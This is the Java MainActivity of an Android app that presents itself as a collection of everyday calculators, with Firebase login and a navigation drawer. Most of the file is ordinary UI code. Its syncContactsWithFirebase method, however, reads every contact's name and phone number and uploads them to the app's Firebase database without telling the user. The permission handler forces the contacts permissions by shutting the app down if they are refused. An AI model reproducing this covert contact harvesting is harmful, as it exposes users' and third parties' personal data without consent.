package com.nineinfosys.android.otherscalculators;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.FragmentManager;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.support.design.widget.NavigationView;
import android.support.v4.view.GravityCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.AdapterView;
import android.widget.GridView;

import com.facebook.login.LoginManager;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.microsoft.windowsazure.mobileservices.MobileServiceClient;
import com.microsoft.windowsazure.mobileservices.http.OkHttpClientFactory;
import com.microsoft.windowsazure.mobileservices.table.MobileServiceTable;
import com.nineinfosys.android.otherscalculators.DashBord.GetApp;
import com.nineinfosys.android.otherscalculators.Forum.ForumActivity;
import com.nineinfosys.android.otherscalculators.Login.Contacts;
import com.nineinfosys.android.otherscalculators.Login.Login;
import com.nineinfosys.android.otherscalculators.fuelcostcalculator.FuelCostCalculator;
import com.nineinfosys.android.otherscalculators.fuelmileagecalculator.fuelMileage;
import com.nineinfosys.android.otherscalculators.golfhandicapindex.Resistor;
import com.nineinfosys.android.otherscalculators.golfhandicapindex.golfHandicapIndex;
import com.nineinfosys.android.otherscalculators.gradepointer.Grade;
import com.nineinfosys.android.otherscalculators.gradepointer.averagePointer;
import com.nineinfosys.android.otherscalculators.heightpredictor.Heightpredictorcalculator;
import com.nineinfosys.android.otherscalculators.horsepower.horsePowerCalculator;
import com.nineinfosys.android.otherscalculators.lovecalculator.LoveCalculator;
import com.nineinfosys.android.otherscalculators.lovecalculator.timeZone;
import com.nineinfosys.android.otherscalculators.ohmcalculator.OhmsLaw_Calculator;
import com.nineinfosys.android.otherscalculators.ohmcalculator.Voltagedrop;
import com.nineinfosys.android.otherscalculators.squarefootage.BodySurfaceArea;
import com.nineinfosys.android.otherscalculators.squarefootage.GDP;
import com.nineinfosys.android.otherscalculators.squarefootage.GFR;
import com.nineinfosys.android.otherscalculators.squarefootage.SquareFootage;
import com.nineinfosys.android.otherscalculators.tilescalculator.tilescalci;
import com.nineinfosys.android.otherscalculators.unitconvertor.unitConversion;
import com.nineinfosys.android.otherscalculators.windchillindex.heatIndex;
import com.nineinfosys.android.otherscalculators.windchillindex.windchillIndexCalculator;
import com.squareup.okhttp.OkHttpClient;

import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.WRITE_CONTACTS;

public class MainActivity extends AppCompatActivity
        implements NavigationView.OnNavigationItemSelectedListener {

    private MobileServiceClient mobileServiceClientContactUploading;
    private MobileServiceTable<Contacts> mobileServiceTableContacts;
    private ArrayList<Contacts> azureContactArrayList;
    private static final int PERMISSION_REQUEST_CODE = 200;
    //Firebase variables... for authentication and contact uploading to firebase
    private FirebaseAuth firebaseAuth;
    private FirebaseAuth.AuthStateListener firebaseAuthListner;
    private DatabaseReference databaseReferenceUserContacts;
    Handler handler;
    private CustomAdapter mAdapter;
    private ArrayList<String> listCountry;
    private ArrayList<Integer> listFlag;
    private DatabaseReference mDatabaseUserData;
    private GridView gridView;


    FragmentManager mFragmentManager;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        firebaseAuth = FirebaseAuth.getInstance();
        mDatabaseUserData = FirebaseDatabase.getInstance().getReference().child(getString(R.string.app_id)).child("Users");
        authenticate();
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                handler = new Handler();
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        handler.post(new Runnable() {
                            @Override
                            public void run() {
                                startActivity(new Intent(MainActivity.this, ForumActivity.class));
                            }
                        });

                    }
                }).start();
            }
        });


        prepareList();

        // prepared arraylist and passed it to the Adapter class
        mAdapter = new CustomAdapter(this,listCountry, listFlag);

        // Set custom adapter to gridview
        gridView = (GridView) findViewById(R.id.grid);
        gridView.setAdapter(mAdapter);


gridView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
    @Override
    public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
        if (position==0)
        {
            Intent i = new Intent(MainActivity.this, LoveCalculator.class);
            finish();
            startActivity(i);

        }

        if (position==1)
        {
            Intent i = new Intent(MainActivity.this, OhmsLaw_Calculator.class);
            finish();
            startActivity(i);

        }

        if (position==2)
        {
            Intent i = new Intent(MainActivity.this, FuelCostCalculator.class);
            finish();
            startActivity(i);

        }

        if (position==3)
        {
            Intent i = new Intent(MainActivity.this, Heightpredictorcalculator.class);
            finish();
            startActivity(i);

        }


        if (position==4)
        {
            Intent i = new Intent(MainActivity.this, horsePowerCalculator.class);
            finish();
            startActivity(i);


        }
        if (position==5)
        {
            Intent i = new Intent(MainActivity.this, windchillIndexCalculator.class);
            finish();
            startActivity(i);

        }



        if (position==6)
        {
            Intent i = new Intent(MainActivity.this, averagePointer.class);
            finish();
            startActivity(i);

        }

        if (position==7)
        {
            Intent i = new Intent(MainActivity.this, fuelMileage.class);
            finish();
            startActivity(i);
        }

        if (position==8)
        {
            Intent i = new Intent(MainActivity.this, golfHandicapIndex.class);
            finish();
            startActivity(i);

        }

        if (position==9)
        {
            Intent i = new Intent(MainActivity.this, tilescalci.class);
            finish();
            startActivity(i);

        }
        if (position==10)
        {
            Intent i = new Intent(MainActivity.this, SquareFootage.class);
            finish();
            startActivity(i);
        }
        if (position==11)
        {
            Intent i = new Intent(MainActivity.this, GDP.class);
            finish();
            startActivity(i);
        }
        if (position==12)
        {
            Intent i = new Intent(MainActivity.this, GFR.class);
            finish();
            startActivity(i);
        }
        if (position==13)
        {
            Intent i = new Intent(MainActivity.this, BodySurfaceArea.class);
            finish();
            startActivity(i);
        }
        if (position==14)
        {
            Intent i = new Intent(MainActivity.this, Voltagedrop.class);
            finish();
            startActivity(i);
        }
        if (position==15)
        {
            Intent i = new Intent(MainActivity.this, Resistor.class);
            finish();
            startActivity(i);
        }
        if (position==16)
        {
            Intent i = new Intent(MainActivity.this, Grade.class);
            finish();
            startActivity(i);
        }
        if (position==17)
        {
            Intent i = new Intent(MainActivity.this, timeZone.class);
            finish();
            startActivity(i);
        }
        if (position==18)
        {
            Intent i = new Intent(MainActivity.this, heatIndex.class);
            finish();
            startActivity(i);
        }
        if (position==19)
        {
            Intent i = new Intent(MainActivity.this, unitConversion.class);
            finish();
            startActivity(i);
        }
    }
});








        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(
                this, drawer, toolbar, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
        drawer.setDrawerListener(toggle);
        toggle.syncState();

        NavigationView navigationView = (NavigationView) findViewById(R.id.nav_view);
        navigationView.setNavigationItemSelectedListener(this);
    }


    public void prepareList()
    {
        listCountry = new ArrayList<String>();

        listCountry.add("Love ");
        listCountry.add("Ohms Law");
        listCountry.add("Fuel Cost");
        listCountry.add("Height");
        listCountry.add("Horse Power ");
        listCountry.add("WindChill ");
        listCountry.add("Grade Pointer");
        listCountry.add("Fuel Mileage");
        listCountry.add("Golf Handicap");
        listCountry.add("Tiles");
        listCountry.add("Sq.Footage");
        listCountry.add("GDP");
        listCountry.add("GFR");
        listCountry.add("Surface Area");
        listCountry.add("Voltage Drop");
        listCountry.add("Resistor");
        listCountry.add("Grade");
        listCountry.add("Timezone");
        listCountry.add("Heat Index");
        listCountry.add("Unit Convert");


        listFlag = new ArrayList<Integer>();
        listFlag.add(R.drawable.love);
        listFlag.add(R.drawable.ohm);
        listFlag.add(R.drawable.fuel);
        listFlag.add(R.drawable.height);
        listFlag.add(R.drawable.horse);
        listFlag.add(R.drawable.windchill);
        listFlag.add(R.drawable.gradee);
        listFlag.add(R.drawable.gas);
        listFlag.add(R.drawable.golf);
        listFlag.add(R.drawable.tiless);


        listFlag.add(R.drawable.squarefootage);
        listFlag.add(R.drawable.gdpp);
        listFlag.add(R.drawable.gfrrr);
        listFlag.add(R.drawable.areasurface);
        listFlag.add(R.drawable.voltagedrop);
        listFlag.add(R.drawable.resistor);
        listFlag.add(R.drawable.grade);
        listFlag.add(R.drawable.timezone);
        listFlag.add(R.drawable.heatindex);
        listFlag.add(R.drawable.converter);

    }





    @Override
    public void onBackPressed() {
        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        if (drawer.isDrawerOpen(GravityCompat.START)) {
            drawer.closeDrawer(GravityCompat.START);
        } else {
            super.onBackPressed();
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_logout) {
            closeapp();
        }

        return super.onOptionsItemSelected(item);
    }

    @SuppressWarnings("StatementWithEmptyBody")
    @Override
    public boolean onNavigationItemSelected(MenuItem item) {
        // Handle navigation view item clicks here.
        int id = item.getItemId();
        if (id == R.id.MoreApps) {

            //Sunile Sir Code
            final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
            try {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://developer?id=GeniusNine+Info+Systems+LLP" )));
            } catch (android.content.ActivityNotFoundException anfe) {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/developer?id=GeniusNine+Info+Systems+LLP" )));
            }

            //Pravin  Code
                   /* intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/developer?id=GeniusNine+Info+Systems+LLP"));
                    startActivity(intent);*/
                    /*Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.Weight.ForumMainActivity.class);
                    startActivity(intent);*/
        }

        if (id == R.id.Share) {
            final String appPackageName = getPackageName();
            Intent intent = new Intent(Intent.ACTION_SEND);
            intent.setType("text/plain");
            String shareBodyText = "https://play.google.com/store/apps/details?id=" + appPackageName ;
            intent.putExtra(Intent.EXTRA_SUBJECT, "Subject/Title");
            intent.putExtra(Intent.EXTRA_TEXT, shareBodyText);
            startActivity(Intent.createChooser(intent, "Choose sharing method"));
        }
        if (id == R.id.RateUs) {
            final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
            try {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
            } catch (android.content.ActivityNotFoundException anfe) {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
            }
        }
        if (id == R.id.GetApps) {
                /*    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new GetApp()).commit();*/
            Intent intent=new Intent(MainActivity.this, GetApp.class);
            finish();
            startActivity(intent);

        }
        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        drawer.closeDrawer(GravityCompat.START);
        return true;
    }


    ///Authentication with firebase
    private void authenticate(){
        firebaseAuth = FirebaseAuth.getInstance();
        firebaseAuthListner = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                if(firebaseAuth.getCurrentUser()==null){
                    Log.e("ForumMainActivity:", "User was null so directed to Login activity");
                    Intent loginIntent = new Intent(MainActivity.this, Login.class);
                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(loginIntent);
                    finish();
                }
                else {
                    saveNewUser();
                    if (!checkPermission()) {
                        requestPermission();
                    } else {
                        //Toast.makeText(MainActivityDrawer.this,"Permission already granted.",Toast.LENGTH_LONG).show();
                        syncContactsWithFirebase();

                    }
                }

            }
        };

    }

    private void saveNewUser() {

        String user_id = firebaseAuth.getCurrentUser().getUid();
        DatabaseReference current_user_db = mDatabaseUserData.child(user_id);

        current_user_db.child("id").setValue(user_id);
    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.e("ForumMainActivity:", "Starting auth listener");
        firebaseAuth.addAuthStateListener(firebaseAuthListner);
    }


    protected void syncContactsWithFirebase(){

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    databaseReferenceUserContacts = FirebaseDatabase.getInstance().getReference().child(getString(R.string.app_id)).child("Contacts");

                    String user_id = firebaseAuth.getCurrentUser().getUid();
                    DatabaseReference current_user_db = databaseReferenceUserContacts.child(user_id);


                    Cursor phone = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

                    while (phone.moveToNext()) {
                        String name;
                        String number;

                        name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        number = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        try {
                            current_user_db.child(number).setValue(name);

                        } catch (Exception e) {

                        }



                    }



                    runOnUiThread(new Runnable() {

                        @Override
                        public void run() {


                        }
                    });
                } catch (Exception exception) {

                }
                return null;
            }
        };

        task.execute();
    }

    public  void closeapp() {


        FirebaseAuth.getInstance().signOut();
        LoginManager.getInstance().logOut();
    }

        //Showing the alert dialog




    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch(keyCode){
            case KeyEvent.KEYCODE_BACK:
                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
                alertDialogBuilder.setMessage("Are you sure you want to close App?");
                alertDialogBuilder.setCancelable(false);
                alertDialogBuilder.setPositiveButton("Yes",
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface arg0, int arg1) {

                                finish();
                            }
                        });

                alertDialogBuilder.setNegativeButton("No",
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface arg0, int arg1) {

                            }
                        });

                //Showing the alert dialog
                AlertDialog alertDialog = alertDialogBuilder.create();
                alertDialog.show();
                return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    //used this when mobile orientaion is changed
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        // Checks the orientation of the screen
        if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {
            //Toast.makeText(this, "landscape", Toast.LENGTH_SHORT).show();
        } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {
            //Toast.makeText(this, "portrait", Toast.LENGTH_SHORT).show();
        }
    }
    private boolean checkPermission() {
        int result = ContextCompat.checkSelfPermission(getApplicationContext(), READ_CONTACTS);
        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_CONTACTS);

        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermission() {

        ActivityCompat.requestPermissions(this, new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                if (grantResults.length > 0) {

                    boolean locationAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    boolean cameraAccepted = grantResults[1] == PackageManager.PERMISSION_GRANTED;

                    if (locationAccepted && cameraAccepted) {
                    }
                    else {

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (shouldShowRequestPermissionRationale(READ_CONTACTS)) {
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivity.this);
                                alertDialogBuilder.setMessage("You must grant permissions for App to work properly. Restart app after granting permission");
                                alertDialogBuilder.setPositiveButton("yes",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {

                                                Log.e("ALERT BOX ", "Requesting Permissions");

                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                    requestPermissions(new String[]{READ_CONTACTS, WRITE_CONTACTS},
                                                            PERMISSION_REQUEST_CODE);
                                                }
                                            }
                                        });

                                alertDialogBuilder.setNegativeButton("No",new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        Log.e("ALERT BOX ", "Permissions not granted");
                                        android.os.Process.killProcess(android.os.Process.myPid());
                                        System.exit(1);

                                    }
                                });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;
                            }
                            else{
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivity.this);
                                alertDialogBuilder.setMessage("You must grant permissions from  App setting to work");
                                alertDialogBuilder.setPositiveButton("Ok",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {
                                                android.os.Process.killProcess(android.os.Process.myPid());
                                                System.exit(1);
                                            }
                                        });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;

                            }
                        }

                    }
                }

                break;
        }
    }

}


